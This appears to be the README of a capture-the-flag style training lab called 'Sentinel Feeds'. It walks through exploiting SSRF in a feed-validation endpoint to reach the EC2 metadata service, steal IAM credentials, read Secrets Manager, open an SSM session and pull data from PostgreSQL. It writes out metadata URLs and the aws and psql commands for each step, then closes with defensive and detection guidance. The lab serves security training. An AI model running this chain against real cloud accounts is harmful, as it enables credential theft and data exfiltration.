# Sentinel Feeds - SSRF to Cloud Credential Theft

**Difficulty:** 5  
**Time:** 60-90 minutes  
**Prerequisites:** HTTP basics, AWS CLI, SSRF concepts, basic SQL

## Scenario

You've discovered an internal threat intelligence feed aggregator used by a government security operations center. The application validates external threat feed URLs before adding them to the aggregation queue. Your objective is to exploit this functionality to access internal cloud resources and exfiltrate classified data from the backend database.

## Objectives

1. Identify the SSRF vulnerability in the feed validation endpoint
2. Exploit SSRF to access EC2 Instance Metadata Service (IMDS)
3. Obtain IAM role credentials from the metadata service
4. Enumerate AWS Secrets Manager for stored credentials
5. Retrieve database credentials from Secrets Manager
6. Connect to the PostgreSQL database and exfiltrate classified data

## Attack Surface

Access the application at `http://[instance-ip]:8080`

The feed aggregator provides:
- Web interface for feed management
- API endpoint for validating external feed URLs
- Backend database storing classified intelligence data

## Enumeration Checklist

### Phase 1: Application Reconnaissance
- What functionality does the feed validation endpoint provide?
- How are URLs processed by the application?
- What response data is returned to the user?
- Are there any restrictions on which URLs can be fetched?

### Phase 2: SSRF Identification
- Can the application be tricked into fetching internal resources?
- What happens when you request localhost or internal IPs?
- Is the AWS metadata service accessible?
- What is the metadata service IP address?

### Phase 3: IMDS Exploitation
- What information is available at the metadata service root?
- Where are IAM credentials stored in the metadata hierarchy?
- What is the instance's IAM role name?
- Can you retrieve temporary security credentials?

### Phase 4: AWS Enumeration
- What permissions does the instance role have?
- What secrets are stored in Secrets Manager?
- What information is contained in the database secret?
- Can you retrieve the secret value?

### Phase 5: Database Access
- What database engine is in use?
- What tables exist in the database?
- What classified data is stored?
- Where is the sensitive configuration data?

## Attack Flow

```
┌─────────────────────────────────────────────────────────────────────────────┐
│                              ATTACK CHAIN                                    │
├─────────────────────────────────────────────────────────────────────────────┤
│                                                                             │
│  [Attacker]                                                                 │
│      │                                                                      │
│      │ 1. SSRF via /api/validate-feed                                       │
│      ▼                                                                      │
│  [Web App] ──────► [IMDS 169.254.169.254]                                   │
│      │                    │                                                 │
│      │                    │ 2. Returns IAM credentials + instance-id        │
│      │                    ▼                                                 │
│      │            {AccessKeyId, SecretAccessKey, Token}                     │
│      │                                                                      │
│      │ 3. Use stolen credentials from attacker machine                      │
│      ▼                                                                      │
│  [Secrets Manager] ◄── aws secretsmanager get-secret-value                  │
│      │                                                                      │
│      │ 4. Returns database credentials                                      │
│      ▼                                                                      │
│  {host, port, username, password}                                           │
│      │                                                                      │
│      │ 5. SSM Session Manager (using stolen creds + instance-id)            │
│      ▼                                                                      │
│  [EC2 Instance] ───► [RDS PostgreSQL]                                       │
│                            │                                                │
│                            │ 6. Query classified data                       │
│                            ▼                                                │
│                      SECRET DATA                                            │
│                                                                             │
└─────────────────────────────────────────────────────────────────────────────┘
```

The database is in a private subnet and only accessible from the application tier. After obtaining credentials, use SSM Session Manager to access the EC2 instance, then connect to the database.

## Key Concepts

### Server-Side Request Forgery (SSRF)
Applications that fetch user-provided URLs without proper validation can be exploited to access internal resources:

```
# Instead of an external threat feed URL:
https://threatfeeds.example.gov/api/indicators

# Request internal metadata service:
http://169.254.169.254/latest/meta-data/
```

### EC2 Instance Metadata Service (IMDS)
AWS EC2 instances can query a link-local address for instance information:

```
# Metadata service root
http://169.254.169.254/latest/meta-data/

# IAM credentials location
http://169.254.169.254/latest/meta-data/iam/security-credentials/

# Get role name, then credentials
http://169.254.169.254/latest/meta-data/iam/security-credentials/[ROLE-NAME]
```

The response contains temporary credentials:
```json
{
  "AccessKeyId": "ASIA...",
  "SecretAccessKey": "...",
  "Token": "...",
  "Expiration": "2024-01-15T12:00:00Z"
}
```

### Using Stolen Credentials
```bash
# Export credentials to environment
export AWS_ACCESS_KEY_ID="ASIA..."
export AWS_SECRET_ACCESS_KEY="..."
export AWS_SESSION_TOKEN="..."

# Verify identity
aws sts get-caller-identity

# Enumerate permissions through trial
aws secretsmanager list-secrets
aws s3 ls
aws ec2 describe-instances
```

### Secrets Manager Enumeration
```bash
# List available secrets
aws secretsmanager list-secrets

# Get secret value
aws secretsmanager get-secret-value --secret-id [SECRET-NAME-OR-ARN]
```

### SSM Session Manager
```bash
# Get instance ID via SSRF
http://169.254.169.254/latest/meta-data/instance-id

# Start session using stolen credentials
aws ssm start-session --target [INSTANCE-ID]
```

SSM Session Manager provides shell access without SSH keys. If the IAM role has `ssm:StartSession` permissions, stolen credentials can be used to access the instance from anywhere.

### PostgreSQL Access
```bash
# Connect with retrieved credentials
psql -h [DB-HOST] -p 5432 -U [USERNAME] -d [DATABASE]

# Or via environment variable
PGPASSWORD='[PASSWORD]' psql -h [DB-HOST] -U [USERNAME] -d [DATABASE]

# List tables
\dt

# Query data
SELECT * FROM system_config;
```

## Defensive Considerations

After completing the lab, consider:

### SSRF Prevention
- Implement allowlists for outbound requests
- Block requests to private IP ranges (10.x, 172.16-31.x, 192.168.x, 169.254.x)
- Use a dedicated egress proxy with URL filtering
- Validate URL schemes (block file://, gopher://, etc.)

### IMDS Protection
- Enable IMDSv2 (requires session tokens)
- Set hop limit to 1 (blocks container escapes)
- Use instance metadata service firewall rules
- Monitor for unusual metadata access patterns

### Secrets Management
- Apply least-privilege to Secrets Manager access
- Use resource-based policies to restrict access
- Enable secret rotation
- Audit secret access via CloudTrail

### Detection Opportunities
- CloudTrail: `secretsmanager:GetSecretValue` from EC2 instance role
- CloudTrail: `ssm:StartSession` from unexpected source IPs
- VPC Flow Logs: Connections from web tier to database tier
- Application logs: Requests to 169.254.169.254
- GuardDuty: Unusual API calls from EC2 credentials
